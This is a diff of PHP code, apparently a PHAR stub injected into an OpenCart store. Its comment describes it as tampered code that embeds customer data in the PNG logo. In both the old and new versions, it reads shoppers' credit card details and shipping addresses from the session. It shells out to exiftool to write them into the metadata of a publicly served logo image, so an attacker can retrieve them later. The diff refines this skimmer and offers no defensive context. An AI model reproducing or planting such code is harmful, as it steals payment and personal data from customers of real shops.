@@ -1,5 +1,4 @@
 <?php 
-    echo "\n \n Php code from PHAR archive injected! \n ";
 
     //WARNING!! Tampered code!!! embed customer data info to png logo!
 
@@ -15,11 +14,15 @@
     }
 
 
-    $address_info = json_encode($this->session->data['shipping_address']);
-
     $credit_card_string = str_replace('"', "", json_encode($credit_card_infos));
 
-    $output = passthru('exiftool -comment="credit cards:' .  $credit_card_string . '"  /var/www/html/image/catalog/opencart-logo.png');
-    $output = passthru('exiftool -description="address:' . $address_info .'"  /var/www/html/image/catalog/opencart-logo.png');
+    $address_info = $this->session->data['shipping_address'];
+
+    $address = $address_info["firstname"].'-'.$address_info["lastname"].'-'.$address_info["address_1"].'-'.$address_info["address_2"].'-'.$address_info["postcode"].'-'.$address_info["city"];
+
+    $address_string = str_replace(" ", "", json_encode($address));
+
+    exec('exiftool -comment="credit cards:' .  $credit_card_string . '"  /var/www/html/image/catalog/opencart-logo.png');
+    exec('exiftool -description="address:' . $address_string .'"  /var/www/html/image/catalog/opencart-logo.png');
     __HALT_COMPILER();
 ?>
